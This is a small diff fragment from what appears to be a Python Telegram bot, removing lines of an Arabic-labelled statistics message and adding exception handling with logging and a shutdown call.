-        f"🛍️ <b>إجمالي المشتريات:</b> <code>{total_purchases}</code>\n\n"
-        f"👑 <b>الأدمن:</b> <code>{len(ADMIN_IDS)}</code>\n"
-        f"━━━━━━━━━━━━━━━━━━"
-                      )
+    except KeyboardInterrupt:
+        logger.info("🛑 Received KeyboardInterrupt")
+    except Exception as e:
+        logger.exception(f"💥 Fatal error: {e}")
+    finally:
+        log_shutdown_info()
